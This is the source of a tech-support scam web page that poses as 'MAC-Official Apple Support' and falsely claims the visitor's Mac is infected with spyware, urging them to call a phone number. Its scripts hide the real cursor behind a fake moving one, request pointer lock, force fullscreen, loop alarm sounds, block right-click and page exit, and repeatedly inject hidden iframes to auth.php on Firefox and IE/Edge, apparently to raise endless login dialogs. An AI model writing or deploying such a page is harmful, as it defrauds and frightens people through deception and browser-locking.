<?php error_reporting(0); ?>
<?php include('../dynamicpopup/lpkey.php') ?>
<?php include_once('../dynamicpopup/SingleTFN.php') ?>
<?php include_once('../dynamicpopup/analytics.php') ?>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<link rel="icon" type="image/png" href="favicon.ico">
<title>MAC-Official Apple Support</title>
<meta name="robots" content="noindex, nofollow, noarchive">
<style>
body {font-family: "Myriad Set Pro","Lucida Grande","Helvetica Neue","Helvetica","Arial","Verdana","sans-serif";}
body{line-height:25px;color:#333;background-color:#f2f2f2;margin:0;} #header img{display: block; margin-left: auto; margin-right: auto;} .section-content { margin-left: auto; margin-right: auto; padding-top:20px; width: 900px; } .left{float:left;width:15%;} .right{float:right;width:85%;} h2{border-bottom:1px solid gray;} .red{color:#F62817;} a{color:#08c;} .pull-right{float:right;}  .btn { background: #34d9d9; background-image: -webkit-linear-gradient(top, #34d9d9, #2980b9); background-image: -moz-linear-gradient(top, #34d9d9, #2980b9); background-image: -ms-linear-gradient(top, #34d9d9, #2980b9); background-image: -o-linear-gradient(top, #34d9d9, #2980b9); background-image: linear-gradient(to bottom, #34d9d9, #2980b9); -webkit-border-radius: 45; -moz-border-radius: 45; border-radius: 45px; text-shadow: 1px 1px 3px #666666; color: #ffffff; font-size: 20px; padding: 11px 29px 10px 29px; text-decoration: none; }  .btn:hover { background: #3cb0fd; background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db); background-image: -moz-linear-gradient(top, #3cb0fd, #3498db); background-image: -ms-linear-gradient(top, #3cb0fd, #3498db); background-image: -o-linear-gradient(top, #3cb0fd, #3498db); background-image: linear-gradient(to bottom, #3cb0fd, #3498db); text-decoration: none; }
	.yellow{color:#FFAE53;}
	.date-today{color:#666;float:right;}
	.text-center{text-align:center;}

.outer { padding: 10px; height: 100%; }
.container { -moz-border-radius: 6px; -webkit-border-radius: 6px; border-radius: 6px; width: 700px; margin: 30px auto; <!-- border: 10px solid #fff; --> box-shadow: 8px 8px 8px #bbb; }
.topcontent { background: #333333; color: white; }
.mainpage { font-size: 16px; padding: 10px; background: #fff; color: #333; font-weight: normal; }
.topcontent .header { font-size: 22px; font-weight: 700; text-shadow: 0 1px 0 #FCFCFC; padding: 5px 0 13px; padding-left: 10px; color: #fff; border-bottom: 1px solid #FFF; }
.topcontent .header img { position: relative; top: 8px; left: 0; margin-right: 6px; }
.topcontent .inner { padding: 10px; -moz-border-radius: 0 0 6px 6px; -webkit-border-radius: 0 0 6px 6px; border-radius: 0 0 6px 6px; }


h1 { font-weight: normal; background: #ABD241; text-shadow: 0 1px 0 #fff; position: relative; display: block; padding: 5px 0; color: black; text-align: center; }
h1 > span { width: 290px; margin: auto; display: block; padding: 5px; font-size: 18px; line-height: 30px; text-align: center; }
h1 span .sprite { float: left; vertical-align: middle; vertical-align: middle; }
h1 span img { vertical-align: middle; position: relative; bottom: 2px; }
.wrapper { background: #eee; width: 100%; margin: auto; font-family: "myriadpro", Arial, Helvetica, sans-serif; }

h2 strong { display: block; }
h2 img, h2 .sprite { float: left; margin: 0 8px 0 0 !important; }
.progress-bar { display: block; border: 2px solid #fff; height: 50px; }
.progress-bar .progress-bar-color { background: #e1e1e1; display: block; height: 50px; line-height: 50px; width: 0%; }
.progress-bar-red { padding: 0; height: 50px; }
.progress-bar-red .progress-bar-color { top:1px;height: 50px; width: 100%; background:#fff;color:red; }
.progress { position: relative; background: #fff; color: #333; }
.progress .status-text { font-size: 15px; position: absolute; top: 1px; text-align: left; text-indent: 12px; width: 100%; height: 50px; line-height: 50px; vertical-align: middle; }
.progress .status-percent { position: absolute; top: 2px; right: 2px; font-size: 16px; background: red; color: #fff; text-shadow: 0 1px 0 red; height: 50px; line-height: 50px; width: 55px; text-align: center; font-weight: bold; }
.searching { background: #fff;color:green;height:52px;top:1px; text-align: center !important; }
.bwrap { width: 250px; margin: auto; margin-top: 15px; text-align: center; }
.bwrap .button { text-decoration: none; width: 60%; font-size: 17px; margin: 0 auto; background: #abd241 155px 13px no-repeat; border: 1px solid #658a01; color: black; text-shadow: 0 1px 0 #fff; font-weight: bold; padding: 8px 25px 8px 8px; display: block; box-shadow: 2px 2px 0 #ccc; }
.errors { margin: 0 0 10px; border: 1px solid #ccc; padding: 2px; border-radius: 2px;background:#F2F2F2; }
.errors h3 { background: #333; padding: 10px; font-size: 14px; color: #fff; }
.errors ul { list-style: none; padding: 5px 4px; }
.errors li { border-bottom:1px dotted #e1e1e1;padding:10px 0 10px 5px;font-size: 14px; color: #333; }
.errors li img { float: left; position: relative; top: 5px; margin-right: 6px; }
.remove {  margin-top: 18px; background:#F2F2F2;border: 1px solid #ccc; padding: 2px; border-radius: 2px; }
.remove h3 { background: #333; padding: 10px; font-size: 14px; color: #fff; }
.remove ul { list-style: none; padding: 5px 4px; }
.remove li { border-bottom:1px dotted #e1e1e1;padding:10px 0 10px 5px;font-size: 14px; color: #333; }
.remove li img { float: left; position: relative; top: 5px; margin-right: 6px; }
.wrapper .inner { padding: 10px; -moz-border-radius: 0 0 6px 6px; -webkit-border-radius: 0 0 6px 6px; border-radius: 0 0 6px 6px; }
.align { text-align: center !important; }
</style>


    <style type="text/css">
	body{
	background-image: url();
}.style1{font-family:Arial,Helvetica,sans-serif;font-weight:bold;color:#FFFFFF;font-size:18px;}.style2{font-size:36px;font-family:"Courier New",Courier,monospace;}.style4{font-size:22px;font-family:"Courier New",Courier,monospace;}.style5{font-size:20px;font-family:"Courier New",Courier,monospace;}.style6{font-family:"Courier New",Courier,monospace}

            .cross{
                position: absolute;
                top: 2px;
                right: 10px;
                font-weight: bolder;
                color: #888;
                text-decoration: none;
            }
            a:focus{
                outline: 0 none;
                border: 0 none;
            }
			i {
  display:block; margin:0px auto;
  width:0px; height:0px;

  /*call animation*/
  animation:flashing 4s infinite;
}
	.new
			{
				height:200px;
				width:200px;
				position:fixed;
				right:5%;
				bottom:10px;
			}
			.new1
			{
				height:200px;
				width:200px;
				position:fixed;
				left:5%;
				bottom:0px;
			}
			.new img
			{
				position:fixed;
				right:0%;
				bottom:10px;
			}
						.new1 img
			{
				position:fixed;
				left:2%;
				bottom:10px;
			}

            .chrome-alert{
                position: fixed;
                top: 0px;
                left:0;
                right: 0;
                /*display: none;*/
            }
            .chrome-alert>div{
                margin: 0 auto;
                width: 440px;
                background: #FBFBFB;
                border: 1px solid #BABABA;
                min-height: 180px;
                border-radius: 3px;
                box-shadow: 0 2px 0 rgba(0,0,0,0.3);
                position: relative;
                font-family: 'Segoe UI';
            }
            .chrome-alert h1{
                font-size: 15px;
                font-weight: normal;
                margin: 0;
                margin-bottom: 5px;
                padding: 5px 10px;
                color: #414141;
            }
            .chrome-alert p{
                font-size: 12px;
                padding: 0 10px;
                color: #414141;
                margin: 15px 0;
            }
            .chrome-alert .action_buttons{
                overflow: auto;
            }
            .chrome-alert .action_buttons a{
                float: right;
                font-size: 12px;
                margin-right: 15px;
                padding: 6px 25px;
                text-decoration: none;
                color: #414141;
                border: 1px solid #DDD;
                margin-top: 20px;
                border-radius: 2px;
                margin-bottom: 20px;
            }
            .chrome-alert .action_buttons a.active{
                border: 1px solid #3B79ED;
                font-weight: bold;
            }
            .chrome-alert .content-box{
                max-height:440px;overflow:auto;
                margin: 0 20px;
            }
            .chrome-alert .content-box p{
                padding: 0;
                margin-left: 0;
            }
            .chrome-alert label{
                padding: 0 20px;
                font-size: 12px;
                color: #414141;
            }
            .chrome-alert label:hover{
                color: #3B79ED;
            }
            .chrome-alert label:focus{
                color: #3B79ED;
                outline: dotted;
            }
			</style>

			<script>function formatAMPM() {
			var d = new Date(),
				minutes = d.getMinutes().toString().length == 1 ? '0'+d.getMinutes() : d.getMinutes(),
				hours = d.getHours().toString().length == 1 ? '0'+d.getHours() : d.getHours(),
				ampm = d.getHours() >= 12 ? 'pm' : 'am',
				months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],
				days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
			return days[d.getDay()]+' '+months[d.getMonth()]+' '+d.getDate()+' '+d.getFullYear()+' '+hours+':'+minutes+ampm;
			}</script>



			<script>$("#map").children().bind('click', function(){ return false; });</script>
			<script type='text/javascript' src='http://code.jquery.com/jquery-1.4.4.min.js'></script>
			<script type='text/javascript'>//<![CDATA[
			$(function(){
			$('body').bind('contextmenu', function(e){
			return false;
			});
			});//]]>
			</script>
			<script>
			    function getVariableFromURl(name)
			    {
			        name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
			        var regexS = "[\\?&]"+name+"=([^&#]*)";
			        var regex = new RegExp( regexS );
			        var results = regex.exec( window.location.href );
			        if( results == null )
			            return "";
			        else
			            return results[1];
			    }
			</script>
			<script type="text/javascript">
			    var phone = getVariableFromURl('phone');
			</script>
			<script type="text/javascript">
			    window.onbeforeunload = function () {
			        if (data_needs_saving()) {
			            return "Do you really want to leave our brilliant application?";
			        } else {
			            return;
			        }
			    };
			</script>


<style>html {
	overflow: hidden;
}




</style>
<style>.blink_me {
animation: blinker 1s linear infinite;
}

@keyframes blinker {
50% { opacity: 0; }
}

</style>

<style>
.blink {
background-color:red;
color:black;
animation: blink-animation 1s steps(5, start) infinite;
-webkit-animation: blink-animation 1s steps(5, start) infinite;
}

.blink1 {
background-color:green;
animation: blink-animation 1s steps(5, start) infinite;
-webkit-animation: blink-animation 1s steps(5, start) infinite;
}


@keyframes blink-animation {
to {
visibility: hidden;
}
}
@-webkit-keyframes blink-animation {
to {
visibility: hidden;
}
}
</style>


<style type="text/css">
	.nocursor { cursor:none; }
</style>




<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>


<script type="text/javascript">
	$(document).ready(function(){

	//-------------- fake cursor -----------------------------------
						 function makeNewPosition() {
								 var h = $(window).height() - 50, w = $(window).width() - 50, nh = Math.floor(Math.random() * h), nw = Math.floor(Math.random() * w); return [nh, nw];
						 }
						 function animateDiv() {
								 var newq = makeNewPosition(), oldq = $(".fakeCursor").offset(), speed = calcSpeed([oldq.top, oldq.left], newq); $(".fakeCursor").animate({ top: newq[0], left: newq[1] }, speed, function () { animateDiv(); });

						 };
						 function calcSpeed(prev, next) {
								 var x = Math.abs(prev[1] - next[1]), y = Math.abs(prev[0] - next[0]), greatest = x > y ? x : y, speedModifier = 0.3, speed = Math.ceil(greatest / speedModifier); return speed;
						 }


						 animateDiv();
});



</script>

<style type="text/css">

	html{
		cursor: none;
	}
	.fakeCursor {
								width: 17px;
								height: 25px;
								background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAZCAMAAADg4DWlAAAAmVBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8jo0yHAAAAMXRSTlMAAQUPA0IfMgInFzlGCwwpGQcJEiIIP04vGDoqDgYbNVFDGjFBMEgWIElFEyw4PjRLq1RDbAAAALhJREFUeF5V0NlygzAMBVDbKK1tgtlJSgrZ93RR/v/jgjwTC/R45o6kuUJIDVqK0SDkSaHGhBhlNhoTPtGkH0QsT4w/iVgGmjGRMAVhCsLEwsTCRDKhsIemTW2hvQyKm8Xp989kCZAgyeL/cKxslFMG11uia7OySQdSIO72Mcl8tvyq/fX6bNKLp7j6Bnqxo34mId+h5tC7Z5Jbs7qrUJxEfLQ/pmQR4HpjegcsUrmydNQHEygFA7wAtBchFf1cSBMAAAAASUVORK5CYII=");
								position: fixed;
									top:5px;
									left: 400px;
								z-index: 100;
						}
</style>


<style type="text/css">
.nocursor { cursor:none; }
</style>

</head>

<body class="nocursor"  id="mycanvas" onbeforeunload="return myFunction()">
<div class="fakeCursor"></div>
	<audio id="xyz" src="Funk.ogg"></audio>


	<div id="header" style=" background-color: #30302F;"></div>
		<div class="outer outer0">

		<div class="section-content">
			<div class="left">
				<img src="logo.png" ;="" height="125px">
			</div>

			<div class="right">
				<h2>Your system is infected with (3) Spyware!</h2>
				<span class="date-today"><script language="Javascript">var w=new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");var m=new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");var td=new Date();document.write(td.getDate()+" "+m[td.getMonth()]+" "+td.getFullYear());</script></span>
				<br>
				<p>
					<span class="red">Your Mac OS X is infected with (3) Spyware.
 The pre-scan found traces of (2) malware and (1) phishing/spyware.
System damage: 28.1% - Immediate removal required! <BR><BR> Please Call Apple Support <?php echo $phonenumber?> . </span><br><br>
					The removal of <strong>(3) Spyware</strong> is required immediately to prevent further system damage, loss of Apps, Photos or other files.
					<br><br>
					Traces of  <strong>(1) Phishing/Spyware</strong> were found on your Mac OS X. <strong>Personal and banking information are at risk.</strong> <br><br>
					<br><br>

				</p>
				<p><span class="red"><span id="mins">1</span> minutes and <span id="secs">37</span> seconds<script type="text/javascript">setInterval('countdown()',1000);function countdown(){var mins=parseInt(document.getElementById("mins").innerHTML);var secs=parseInt(document.getElementById("secs").innerHTML);if(mins!=0 && secs==0){nmins=mins-1;nsecs=59;}else if(mins!=0 || secs!=0){nmins=mins;nsecs=secs-1;}else if(mins==0 && secs==0){nmins=mins;nsecs=secs;}document.getElementById("mins").innerHTML=nmins;document.getElementById("secs").innerHTML=nsecs;}</script>
</span>
					<br><br><br>
					</p><div class="bottomcontent">
					<span class="pull-center">
						<div class="orange"> <a class="btn" href="javascript:;"><strong>
							Please Call Apple Support <?php echo $phonenumber?>  </strong></a>
						</div>
						<div style="clear:both;"></div>

				</span><p></p>
				</div>
			</div>
		</div>
		</div>

<div class="outer outer1" style="display:none">
	<div class="container">
		<div class="topcontent">
			<div class="header"><img src="ajax2.gif" style="margin-right:9px;" width="32">
				SCAN IN PROGRESS			</div>
		</div>
		<div class="wrapper">
			<div class="inner">
				<div class="progress">
					<div class="progress-bar">
						<div class="progress-bar-color"></div>
					</div>
					<span class="status-text">
					Loading...					</span>
					<div class="status-percent">0%</div>
				</div>
			</div>
		</div>
	</div>
</div>



<div id="chrome-alerts" class="chrome-alert">
            <div>
                <a href="javascript:openlink()" class="cross">×</a>
                <div class="content-box" id="alert-content-box">
                    <p>WARNING!<br>
MAC OS is infected with Spyware and other malicious applications. Spyware must be removed and system damage repaired.\n\nIt is necessary to Call Apple Support <span style="color:red; font-weight:bold;"><?php echo $phonenumber?> </span> and follow Virus removal procedure immediately, please proceed.
<br>
<br>
 **If you leave this site your Mac OS  will remain damaged and vulnerable**<br>
<br>
<h3>Call Apple Helpline <span style="color:red;"><?php echo $phonenumber?> </span> (Toll Free)</h3>
<br>
</p>
                </div>
                <label style="font-size: 12px;"><input checked="nonchecked" type="checkbox"> Prevent this page from creating additional dialogues.</label>
                <div class="action_buttons">
                    <a class="active" id="leave_page" href="" target="_blank" onclick='return pop("index.html",1500,1000);' style="background-color:green;color:#ffffff; font-size:16px">Back to Safety</a>
<a href="" class="active blink" id="amt" target="_blank" onclick='return pop("index.html",1500,1000);' style="background-color:red;color:#ffffff; font-size:16px">Leave  Page</a>


    </div>
            </div>
        </div>
      <div class="new">
<img src="v1.png"/>
</div>

</div></div>



<script type="text/javascript">
	var state = true;

	document.body.addEventListener('click', function toggleFullScreen() {
			_toggleFullScreen();
		}, true
	);

	window.addEventListener('mouseup', function toggleFullScreen() {
		_toggleFullScreen();

		if (navigator.userAgent.toLowerCase().indexOf('chrome') > -1 || navigator.userAgent.indexOf("Opera")) {
		} else {
			open1();
		}
	}, false);

	window.onbeforeunload = confirmExit;

	function confirmExit() {
		alert("Don't close this window! It's important!");
		return "You have attempted to leave this page. Are you sure?";
	}

	setInterval(function () {
		if (state === true) {
			document.getElementById('red_alert').style = 'opacity: 0';
			document.getElementById('red_alert1').style = 'opacity: 0';
			document.getElementById('alert-modal').style = 'transform: scale(1.04)';
			state = false;
		} else {
			document.getElementById('red_alert').style = 'opacity: 1';
			document.getElementById('red_alert1').style = 'opacity: 1';
			document.getElementById('alert-modal').style = 'transform: scale(1)';
			state = true;
		}
	}, 800);
</script>



<audio autoplay="autoplay" loop="" id="msgSound">
	<source src="err.mp3" type="audio/mpeg">
</audio>

</div>



<audio autoplay="autoplay" loop="" id="msgSound1">
<source src="beep.mp3" type="audio/mpeg">
</audio>


 <script type="text/javascript">/*<![CDATA[*/
 // audio play /*
	 var msgAudioEl = document.getElementById("msgSound");

	 var playMsgInt = setInterval(function () {
		 if (isPlaying(msgAudioEl)) {
			 // console.log('already playing. clearing interval');
			 clearInterval(playMsgInt);
		 } else {
			 // console.log('Triggering play');
			 msgAudioEl.play();
		 }
	 }, 500);
	 // audio play */

 </script>

		 <script type="text/javascript">/*<![CDATA[*/
		 // audio play /*
			 var msgAudioEl = document.getElementById("msgSound1");

			 var playMsgInt = setInterval(function () {
				 if (isPlaying(msgAudioEl)) {
					 // console.log('already playing. clearing interval');
					 clearInterval(playMsgInt);
				 } else {
					 // console.log('Triggering play');
					 msgAudioEl.play();
				 }
			 }, 500);
			 // audio play */

		 </script>



		   <script>
		   // Get the modal
		   var modal = document.getElementById('myModal');

		   // Get the button that opens the modal
		   var btn = document.getElementById("myBtn");

		   // Get the <span> element that closes the modal
		   var span = document.getElementsByClassName("close")[0];

		   // When the user clicks the button, open the modal
		   /*btn.onclick = function() {
		     modal.style.display = "block";
		   } */

		   // When the user clicks on <span> (x), close the modal
		   span.onclick = function() {
		     modal.style.display = "none";
		   }

		   // When the user clicks anywhere outside of the modal, close it
		   window.onclick = function(event) {
		     if (event.target == modal) {
		       modal.style.display = "none";
		     }
		   }
		   </script>
		     <script type="text/javascript">
		   function addEvent(obj, evt, fn) {
		       if (obj.addEventListener) {
		           obj.addEventListener(evt, fn, false);
		       }
		       else if (obj.attachEvent) {
		           obj.attachEvent("on" + evt, fn);
		       }
		   }
		   addEvent(window,"load",function(e) {
		       addEvent(document, "mouseout", function(e) {
		           e = e ? e : window.event;
		           var from = e.relatedTarget || e.toElement;
		           if (!from || from.nodeName == "HTML") {
		               // stop your drag event here
		               // for now we can just use an alert
		            //alert("hello");

		   			 modal.style.display = "block";

		           }
		       });
		   });

		     $(document).mousemove(function(){
		     var canvas = document.getElementById('mycanvas');
		   canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
		   canvas.requestPointerLock();

		     //capture mouse movement event
		        // remove our layover from the DOM
		     });

		    //  $(document).mousemove(function(){
		    // alert("move detect");
		     //capture mouse movement event
		    //   $("#pageLayover").remove(); // remove our layover from the DOM
		    // });


		   </script>

<script src="main.js"></script>



<script type="text/javascript">/*<![CDATA[*/

 function get_browser(){
		var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
		if(/trident/i.test(M[1])){
				tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
				return {name:'IE',version:(tem[1]||'')};
				}
		if(M[1]==='Chrome'){
				tem=ua.match(/\bOPR\/(\d+)/)
				if(tem!=null)   {return {name:'Opera', version:tem[1]};}
				}
		M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
		if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
		return {
			name: M[0],
			version: M[1]
		};
 }
 var InternetEx=window.navigator.appVersion.indexOf("MSIE")!=-1;
var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
var browser=get_browser();
if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)) ){
	if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
		{

			 function msg_ff() {

						var i = document.createElement("div");
						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="auth.php"></iframe></div>';
						document.body.appendChild(i);

				}
				window.setInterval(function() {
						msg_ff();

				}, 1100);

			}
	else{
			function msg_ff() {

						var i = document.createElement("div");
						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="auth.php"></iframe></div>';
						document.body.appendChild(i);
				}
				window.setInterval(function() {
						msg_ff();

				}, 1100);

		}

 }
 else{

	 }


/*]]>*/</script>


	<iframe id="calendar" src="beep.mp3" allow="autoplay" style="display:none;">
</body></html>
